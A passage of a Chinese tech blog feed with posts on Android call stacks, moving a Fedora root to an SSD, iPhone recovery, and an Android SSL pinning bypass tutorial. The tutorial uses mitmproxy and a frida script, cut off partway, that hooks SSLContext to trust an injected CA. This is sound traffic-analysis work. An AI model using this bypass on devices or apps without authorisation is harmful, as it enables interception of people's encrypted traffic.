/sbin/adbd</span><br><span class="line">  #03 pc 0002a613  /sbin/adbd</span><br><span class="line">  #04 pc 00030283  /sbin/adbd</span><br><span class="line"></span><br><span class="line">&quot;adbd&quot; sysTid=23853</span><br><span class="line">  #00 pc 0002b628  /sbin/adbd</span><br><span class="line">  #01 pc 00013999  /sbin/adbd</span><br><span class="line">  #02 pc 000112ed  /sbin/adbd</span><br><span class="line">  #03 pc 000104e1  /sbin/adbd</span><br><span class="line">  #04 pc 0002a613  /sbin/adbd</span><br><span class="line">  #05 pc 00030283  /sbin/adbd</span><br><span class="line"></span><br><span class="line">&quot;adbd&quot; sysTid=23862</span><br><span class="line">  #00 pc 0002b888  /sbin/adbd</span><br><span class="line">  #01 pc 0000a503  /sbin/adbd</span><br><span class="line">  #02 pc 00009527  /sbin/adbd</span><br><span class="line">  #03 pc 0002a613  /sbin/adbd</span><br><span class="line">  #04 pc 00030283  /sbin/adbd</span><br><span class="line"></span><br><span class="line">----- end 23850 -----</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><h2 id="☆-java-代码中打印调用栈"><a href="#☆-java-代码中打印调用栈" class="headerlink" title="☆ java 代码中打印调用栈"></a>☆ java 代码中打印调用栈</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;  </span><br><span class="line"> ...  </span><br><span class="line">&#125; <span class="keyword">catch</span> (RemoteException e) &#123;  </span><br><span class="line">  e.printStackTrace();  </span><br><span class="line">  ...  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="☆-C-代码中打印调用栈"><a href="#☆-C-代码中打印调用栈" class="headerlink" title="☆ C++代码中打印调用栈"></a>☆ C++代码中打印调用栈</h2><p>CallStack.cpp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;utils/CallStack.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    android::CallStack stack;</span><br><span class="line">    stack.<span class="built_in">update</span>(); </span><br><span class="line">    stack.<span class="built_in">dump</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Android.mk</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_PATH:= $(call my-dir)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line">LOCAL_SRC_FILES:= CallStack.cpp</span><br><span class="line">LOCAL_SHARED_LIBRARIES += libutils</span><br><span class="line">LOCAL_LDLIBS += -ldl -lutils</span><br><span class="line"></span><br><span class="line">LOCAL_CFLAGS := $(common_CFLAGS)</span><br><span class="line">LOCAL_MODULE := CallStack</span><br><span class="line">include $(BUILD_EXECUTABLE)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行后显示类似下面的结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@shamu:/data/local/tmp # ./CallStack</span><br><span class="line">#00 pc 000006d1  /data/local/tmp/CallStack</span><br><span class="line">#01 pc 00017359  /system/lib/libc.so (__libc_init+44)</span><br><span class="line">#02 pc 0000074c  /data/local/tmp/CallStack</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;☆-使用kill-发送-SIGNAL-QUIT&quot;&gt;&lt;a href=&quot;#☆-使用kill-发送-SIGNAL-QUIT&quot; class=&quot;headerlink&quot; title=&quot;☆ 使用kill 发送 SIGNAL_QUIT&quot;&gt;&lt;/a&gt;☆ 使用kill 发送 SIGNA</summary>
      
    
    
    
    
    <category term="Android" scheme="http://usmacd.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>SSD 迁移记</title>
    <link href="http://usmacd.com/2021/11/03/ssd/"/>
    <id>http://usmacd.com/2021/11/03/ssd/</id>
    <published>2021-11-03T01:46:03.591Z</published>
    <updated>2021-11-03T01:46:03.591Z</updated>
    
    <content type="html"><![CDATA[<p>由于某些需求，决定上SSD，提高一下硬盘读写速度。上二手东买了三星(SAMSUNG) 860 EVO<br>最初的想法是作为数据盘使用，即操作系统还是跑在机械硬盘上，仔细一思考，还是折腾<br>一下，要不实在是有些浪费，事实证明，折腾是值得的，感觉就想飞一样。</p><p>首先查看一下原始的情况：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ mount</span><br><span class="line"></span><br><span class="line">/dev/sda1 on /boot <span class="built_in">type</span> ext4 (rw,relatime,seclabel,stripe=4)</span><br><span class="line">/dev/mapper/fedora-root on / <span class="built_in">type</span> ext4 (rw,relatime,seclabel)</span><br></pre></td></tr></table></figure><p>当然首先要把SSD处理一下，安装一下 gparted 图形化界面很好用。建个分区表，选择<br>gpt，分个区，/dev/mapper/fedora-root 大小为50G，先分个50G的分区，剩下的全部给<br>另外一个分区，格式化为 ext4。操作完成后，用fdisk 查看一下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ fdisk -l</span><br><span class="line"></span><br><span class="line">Disk /dev/sdb：232.9 GiB，250059350016 字节，488397168 个扇区</span><br><span class="line">单元：扇区 / 1 * 512 = 512 字节</span><br><span class="line">扇区大小(逻辑/物理)：512 字节 / 512 字节</span><br><span class="line">I/O 大小(最小/最佳)：512 字节 / 512 字节</span><br><span class="line">磁盘标签类型：gpt</span><br><span class="line">磁盘标识符：</span><br><span class="line"></span><br><span class="line">设备            起点      末尾      扇区   大小 类型</span><br><span class="line">/dev/sdb1       2048 104859647 104857600    50G Linux 文件系统</span><br><span class="line">/dev/sdb2  104859648 488396799 383537152 182.9G Linux 文件系统</span><br></pre></td></tr></table></figure><p>将原来系统的 / dd 到新的SSD，</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="keyword">if</span>=/dev/mapper/fedora-root of=/dev/sdb1 bs=1M</span><br></pre></td></tr></table></figure><p>用新的root 把系统启动起来，reboot 后进入引导界面，按e 编译，找到<br>root=/dev/fedora/root 改为 root=/dev/sdb1 按 ctrl+x 启动，一会儿就进系统了，速度<br>提升很大。现在需要把 grub.cfg 更新一下，因为我们是手动修改进入了新的根，如果重启<br>的话，还是会使用老的根，因为grub.cfg 里就是这么写的。</p><p>要生成新的grub.cfg 需要使用grub2-mkconfig, 命令很简单</p><p><code>$ grub2-mkconfig -o /boot/grub2/grub.cfg</code></p><p>执行后重启，md 怎么又进到老根去了。这里折腾了好久，第一个问题fedora 的内核出bug<br>了，每次重启都要等待非常久的时间，所以需要升级，所以正确的顺序应该是先升级系统再<br>dd，没办法升级系统重新 dd</p><p>解决了fedora 内核的问题后，发现还是进不到新根。只要认真地看 grub.cfg, grub2 改动<br>挺大，不太熟悉了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#                                      </span><br><span class="line"># DO NOT EDIT THIS FILE                                                                                                                                                                       #                                                   </span><br><span class="line"># It is automatically generated by grub2-mkconfig using templates                                                                                                                             </span><br><span class="line"># from /etc/grub.d and settings from /etc/default/grub</span><br></pre></td></tr></table></figure><p>启动有两个信息，确实是使用 grub2-mkconfig 生成，/etc/default/grub 里有配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/default/grub</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GRUB_TIMEOUT=5</span><br><span class="line">GRUB_DISTRIBUTOR=&quot;$(sed &#x27;s, release .*$,,g&#x27; /etc/system-release)&quot;</span><br><span class="line">GRUB_DEFAULT=saved</span><br><span class="line">GRUB_DISABLE_SUBMENU=true</span><br><span class="line">GRUB_TERMINAL_OUTPUT=&quot;console&quot;</span><br><span class="line">GRUB_CMDLINE_LINUX=&quot;rd.driver.blacklist=nouveau modprobe.blacklist=nouveau nvidia-drm.modeset=1 rd.lvm.lv=fedora/root rd.lvm.lv=fedora/swap rhgb quiet&quot;                                      </span><br><span class="line">GRUB_DISABLE_RECOVERY=&quot;true&quot;</span><br></pre></td></tr></table></figure><p>grub2-mkconfig 里用这句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRUB_DEVICE=&quot;`$&#123;grub_probe&#125; --target=device /`&quot;  </span><br></pre></td></tr></table></figure><p>执行查看结果， 发现正确</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ grub2-probe --target=device /</span><br><span class="line"></span><br><span class="line">/dev/sdb1</span><br></pre></td></tr></table></figure><p>可是为什么不能正确启动呢，看看生成的 grub.cfg 文件</p><p>linux16 /vmlinuz-4.17.2-200.fc28.x86_64 root=UUID=290a98e3-7937-49db-a971-4d0e49567cf0</p><p>使用的是 UUID，并不是 /dev, 查看一下各分区的 uuid</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># blkid</span></span><br><span class="line"></span><br><span class="line">/dev/sdb1: UUID=<span class="string">&quot;290a98e3-7937-49db-a971-4d0e49567cf0&quot;</span> TYPE=<span class="string">&quot;ext4&quot;</span> PARTUUID=<span class="string">&quot;fe64f395-7520-42c3-939b-b17eb7064cec&quot;</span></span><br><span class="line">/dev/mapper/fedora-root: UUID=<span class="string">&quot;290a98e3-7937-49db-a971-4d0e49567cf0&quot;</span> TYPE=<span class="string">&quot;ext4&quot;</span></span><br></pre></td></tr></table></figure><p>由于dd 的原因，/dev/sdb1 和 /dev/mapper/fedora-root 的 UUID 居然是相同的。第一个<br>想法是把/dev/sdb1 的 UUID 给改了。放狗搜发现有下面的方法</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ uuidgen </span><br><span class="line">8e4c27b2-c63e-4d1d-8ac4-5ddd90669eb0</span><br><span class="line"></span><br><span class="line">tune2fs /dev/&#123;device&#125; -U &#123;uuid&#125;</span><br></pre></td></tr></table></figure><p>可是tune2fs 时报错，死活改不过来。lzx 提示可以看看如何是grub.cfg 不使用uuid，<br>发现有个参数 GRUB_DISABLE_UUID=true， 在 /etc/default/grub 加上这行，重新生成<br>grub.cfg 重启，一切 OK 进入到SSD 的新root</p><p>有的系统上的参数可能不太一样，ubuntu 系统里这个参数好像的是 GRUB_DISABLE_LINUX_UUID=true<br>可能需要确认一下。</p><ul><li>EOF</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;由于某些需求，决定上SSD，提高一下硬盘读写速度。上二手东买了三星(SAMSUNG) 860 EVO&lt;br&gt;最初的想法是作为数据盘使用，即操作系统还是跑在机械硬盘上，仔细一思考，还是折腾&lt;br&gt;一下，要不实在是有些浪费，事实证明，折腾是值得的，感觉就想飞一样。&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
    <category term="linux" scheme="http://usmacd.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>iPhone 内存满了, 白苹果问题解决方法</title>
    <link href="http://usmacd.com/2021/09/23/iPhone_white_apple/"/>
    <id>http://usmacd.com/2021/09/23/iPhone_white_apple/</id>
    <published>2021-09-23T02:58:52.352Z</published>
    <updated>2021-09-23T02:58:52.352Z</updated>
    
    <content type="html"><![CDATA[<p>上周媳妇的 iPhone 提示内存满了，重启后就进入白苹果状态。安装 itunes 以更新的方式重刷系统后恢复正常 （如果选择恢复模式则会丢失数据）。<br>刷系统的时候一度遇上 14 错误，重新使用更新系统的方式再刷了一遍后，顺利通过 （运气不错）。顺利登录 iPhone 后马上删除各种 App，清理后台驻留的程序，在此也提示大家 iPhone 手机也是要定期维护啊。</p><p>说起来就上面几句话，实际操作起来比较麻烦，大概弄了一个早上，把几个要点总结一下。</p><h2 id="强制重新启动-iPhone"><a href="#强制重新启动-iPhone" class="headerlink" title="强制重新启动 iPhone"></a>强制重新启动 iPhone</h2><p>其实在刷机前我尝试了强制重启 iPhone，强制重启 iPhone 的方法可以参考下面链接：<br><a href="https://support.apple.com/zh-cn/guide/iphone/iph8903c3ee6/ios">https://support.apple.com/zh-cn/guide/iphone/iph8903c3ee6/ios</a></p><p>新版 iPhone 可以使用下面的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">强制重新启动配备面容 ID 的 iPhone</span><br><span class="line"></span><br><span class="line">若要强制重新启动 iPhone X、iPhone XS、iPhone XR、iPhone 11、iPhone 12 或 iPhone 13，请执行以下操作：</span><br><span class="line"></span><br><span class="line">按下并快速松开调高音量按钮，按下并快速松开调低音量按钮，然后按住侧边按钮。当 Apple 标志出现时，松开按钮。</span><br></pre></td></tr></table></figure><p>但是强制重启 iPhone 并没有成功，手机依然处于白苹果状态没有响应。</p><h2 id="进入-DFU-模式"><a href="#进入-DFU-模式" class="headerlink" title="进入 DFU 模式"></a>进入 DFU 模式</h2><p>不进入 DFU 模式无法刷机，iPhone 不同机型进入 DFU 模式的方法不相同，具体的可以参考下面链接：<br><a href="https://support.apple.com/en-us/HT201263">https://support.apple.com/en-us/HT201263</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iPhone 8 or later: Press and quickly release the Volume Up button. </span><br><span class="line">Press and quickly release the Volume Down button. </span><br><span class="line">Then, press and hold the Side button until you see the recovery mode screen.</span><br></pre></td></tr></table></figure><h2 id="安装-itunes-刷机"><a href="#安装-itunes-刷机" class="headerlink" title="安装 itunes 刷机"></a>安装 itunes 刷机</h2><p>安装 itunes 的过程就不在细说了，正常安装即可。更新过程需要注意中间某个步骤可能耗时很长，不要着急得慢慢等，Apple 还专门有链接说明这个问题。<br><a href="https://support.apple.com/zh-cn/HT203435">https://support.apple.com/zh-cn/HT203435</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">出现这种情况后，进度条可能移动非常缓慢或似乎不移动。</span><br><span class="line"></span><br><span class="line">请等待设备完成更新、恢复或抹掉过程。</span><br><span class="line"></span><br><span class="line">进度条会显示安装进度。所用时间取决于设备上的文件数量，以及您是要抹掉、更新还是升级 iOS 或 iPadOS。</span><br><span class="line">如果设备上只有很少数据或没有数据，或者如果您要抹掉设备上的数据，这个过程可能只需一分钟时间。</span><br><span class="line">如果设备包含大量文件，则这个过程可能需要数分钟至一小时不等。</span><br></pre></td></tr></table></figure><p>刷机过程中大概率会遇上 14 错误，网络上说法很多大概就两点。</p><ul><li>（1）挑线，要保证 USB 数据线有效，优先使用 USB 2.0</li><li>（2）多刷几次，反复刷</li></ul><p>我这次运气不错，遇上 14 错误后，换了个 USB 2.0 的口重刷一次就过了，祝大家好运。</p><p>重启后需要输入密码，提示尝试恢复数据，进度跑完就大功告成了。</p><h2 id="事后的清理工作"><a href="#事后的清理工作" class="headerlink" title="事后的清理工作"></a>事后的清理工作</h2><p>恢复完数据，登录媳妇的手机发现以下几点问题：</p><ul><li>（1） 手机存储空间紧张</li><li>（2） 后台驻留的程序比较多</li></ul><p>导致白苹果的原因未知，将这些问题解决了一下，希望能正常使用了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;上周媳妇的 iPhone 提示内存满了，重启后就进入白苹果状态。安装 itunes 以更新的方式重刷系统后恢复正常 （如果选择恢复模式则会丢失数据）。&lt;br&gt;刷系统的时候一度遇上 14 错误，重新使用更新系统的方式再刷了一遍后，顺利通过 （运气不错）。顺利登录 iPhone</summary>
      
    
    
    
    
    <category term="Life" scheme="http://usmacd.com/tags/Life/"/>
    
  </entry>
  
  <entry>
    <title>Andorid 绕过 SSL Pinning 抓 https 报文</title>
    <link href="http://usmacd.com/2021/09/01/Android_SSL_Pinning/"/>
    <id>http://usmacd.com/2021/09/01/Android_SSL_Pinning/</id>
    <published>2021-09-01T04:16:16.663Z</published>
    <updated>2021-09-01T04:16:16.663Z</updated>
    
    <content type="html"><![CDATA[<h3 id="SSL-pinning"><a href="#SSL-pinning" class="headerlink" title="SSL pinning"></a>SSL pinning</h3><p>SSL Pinning是一种防止中间人攻击的技术，主要机制是在客户端发起请求–&gt;收到服务器发来的证书进行校验，如果收到的证书不被客户端信任，就直接断开连接不继续请求。可以发现中间人攻击的要点是伪造了一个假的服务端证书给了客户端，客户端误以为真。解决思路就是，客户端也预置一份服务端的证书，比较一下就知道真假了。</p><p>SSL-pinning有两种方式：证书锁定（Certificate Pinning） 和公钥锁定（ Public Key Pinning）。</p><h4 id="证书锁定"><a href="#证书锁定" class="headerlink" title="证书锁定"></a>证书锁定</h4><p>需要在客户端代码内置仅接受指定域名的证书，而不接受操作系统或浏览器内置的CA根证书对应的任何证书，通过这种授权方式，保障了APP与服务端通信的唯一性和安全性，因此客户端与服务端（例如API网关）之间的通信是可以保证绝对安全。但是CA签发证书都存在有效期问题，缺点是在证书续期后需要将证书重新内置到APP中。</p><h4 id="公钥锁定"><a href="#公钥锁定" class="headerlink" title="公钥锁定"></a>公钥锁定</h4><p>提取证书中的公钥并内置到客户端中，通过与服务器对比公钥值来验证连接的正确性。制作证书密钥时，公钥在证书的续期前后都可以保持不变（即密钥对不变），所以可以避免证书有效期问题，一般推荐这种做法。</p><p>（此小节内容摘抄自互联网）</p><h3 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h3><p>使用 mitmproxy <a href="https://github.com/mitmproxy/mitmproxy">https://github.com/mitmproxy/mitmproxy</a>  进行抓包，使用 frida 绕过 SSL pinning， frida 的安装和使用这里就不再详述了，可以参考其他资料。</p><h3 id="安装-mitmproxy"><a href="#安装-mitmproxy" class="headerlink" title="安装 mitmproxy"></a>安装 mitmproxy</h3><p>参考 <a href="https://docs.mitmproxy.org/stable/overview-installation/">https://docs.mitmproxy.org/stable/overview-installation/</a> 文档</p><p>可以直接下载 Linux binary： <a href="https://snapshots.mitmproxy.org/7.0.2/mitmproxy-7.0.2-linux.tar.gz%EF%BC%8C">https://snapshots.mitmproxy.org/7.0.2/mitmproxy-7.0.2-linux.tar.gz，</a> 或者使用 pip 进行安装 <code>https://pypi.org/project/mitmproxy/</code><br>执行命令 <code>~/.local/bin/pip3 install mitmproxy --user</code></p><p>安装成功之后，有三个程序可以使用： <code>mitmproxy</code>，<code>mitmdump</code>， <code>mitmweb</code></p><h3 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h3><p>在主机上执行下面几行命令设置代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mitmweb -p 8080</span><br><span class="line">adb shell settings put global http_proxy 127.0.0.1:8888</span><br><span class="line">adb reverse tcp:8888 tcp:8080</span><br></pre></td></tr></table></figure><p>mitmweb -p 8080 在本机起 8080 代理，在 Android 上设置 http 全局代理 127.0.0.1:8888， 最后将 Android 的 8888 端口转发到本机 8080 端口</p><h3 id="设置-CA"><a href="#设置-CA" class="headerlink" title="设置 CA"></a>设置 CA</h3><p><a href="https://docs.mitmproxy.org/stable/concepts-certificates/">https://docs.mitmproxy.org/stable/concepts-certificates/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The first time mitmproxy is run, it creates the keys for a certificate authority (CA) in the config directory (~/.mitmproxy by default).</span><br></pre></td></tr></table></figure><table><thead><tr><th>Filename</th><th>Contents</th></tr></thead><tbody><tr><td>mitmproxy-ca.pem</td><td>The certificate and the private key in PEM format.</td></tr><tr><td>mitmproxy-ca-cert.pem</td><td>The certificate in PEM format. Use this to distribute on most non-Windows platforms.</td></tr><tr><td>mitmproxy-ca-cert.p12</td><td>The certificate in PKCS12 format. For use on Windows.</td></tr><tr><td>mitmproxy-ca-cert.cer</td><td>Same file as .pem, but with an extension expected by some Android devices.</td></tr></tbody></table><p>我们是 Android 应该使用 <code>mitmproxy-ca-cert.cer</code>，在 Android 系统安装的话，需要点击 设置 -〉安全 -〉 加密与凭证 -〉安装证书 -〉CA 证书</p><h3 id="使用-frida-绕过-SSL-pinning"><a href="#使用-frida-绕过-SSL-pinning" class="headerlink" title="使用 frida 绕过 SSL pinning"></a>使用 frida 绕过 SSL pinning</h3><p>使用 frida 脚本首先需要将 <code>mitmproxy-ca-cert.cer</code> 上传到 <code>/data/local/tmp/cert-der.crt</code></p><p>使用脚本 <a href="https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/">https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Android SSL Re-pinning frida script v0.2 030417-pier</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   $ adb push burpca-cert-der.crt /data/local/tmp/cert-der.crt</span></span><br><span class="line"><span class="comment">   $ frida -U -f it.app.mobile -l frida-android-repinning.js --no-pause</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   https://techblog.mediaservice.net/2017/07/universal-android-ssl-pinning-bypass-with-frida/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   UPDATE 20191605: Fixed undeclared var. Thanks to @oleavr and @ehsanpc9999 !</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[.] Cert Pinning Bypass/Re-Pinning&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> CertificateFactory = Java.use(<span class="string">&quot;java.security.cert.CertificateFactory&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> FileInputStream = Java.use(<span class="string">&quot;java.io.FileInputStream&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> BufferedInputStream = Java.use(<span class="string">&quot;java.io.BufferedInputStream&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> X509Certificate = Java.use(<span class="string">&quot;java.security.cert.X509Certificate&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> KeyStore = Java.use(<span class="string">&quot;java.security.KeyStore&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> TrustManagerFactory = Java.use(<span class="string">&quot;javax.net.ssl.TrustManagerFactory&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> SSLContext = Java.use(<span class="string">&quot;javax.net.ssl.SSLContext&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Load CAs from an InputStream</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[+] Loading our CA...&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> cf = CertificateFactory.getInstance(<span class="string">&quot;X.509&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> fileInputStream = FileInputStream.$new(<span class="string">&quot;/data/local/tmp/cert-der.crt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&quot;[o] &quot;</span> + err);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> bufferedInputStream = BufferedInputStream.$new(fileInputStream);</span><br><span class="line">    <span class="keyword">var</span> ca = cf.generateCertificate(bufferedInputStream);</span><br><span class="line">    bufferedInputStream.close();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> certInfo = Java.cast(ca, X509Certificate);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[o] Our CA Info: &quot;</span> + certInfo.getSubjectDN());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create a KeyStore containing our trusted CAs</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[+] Creating a KeyStore for our CA...&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> keyStoreType = KeyStore.getDefaultType();</span><br><span class="line">    <span class="keyword">var</span> keyStore = KeyStore.getInstance(keyStoreType);</span><br><span class="line">    keyStore.load(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    keyStore.setCertificateEntry(<span class="string">&quot;ca&quot;</span>, ca);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create a TrustManager that trusts the CAs in our KeyStore</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[+] Creating a TrustManager that trusts the CA in our KeyStore...&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> tmfAlgorithm = TrustManagerFactory.getDefaultAlgorithm();</span><br><span class="line">    <span class="keyword">var</span> tmf = TrustManagerFactory.getInstance(tmfAlgorithm);</span><br><span class="line">    tmf.init(keyStore);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[+] Our TrustManager is ready...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[+] Hijacking SSLContext methods now...&quot;</span>)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[-] Waiting for the app to invoke SSLContext.init()...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    SSLContext.init.overload(<span class="string">&quot;[Ljavax.net.ssl.KeyManager;&quot;</span>, <span class="string">&quot;[Ljavax.net.ssl.TrustManager;&quot;</span>, <span class="string">&quot;java.security.SecureRandom&quot;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">a,b,c</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&quot;[o] App invoked javax.net.ssl.SSLContext.init...&quot;</span>);</span><br><span class="line">      SSLContext.init.overload(<span 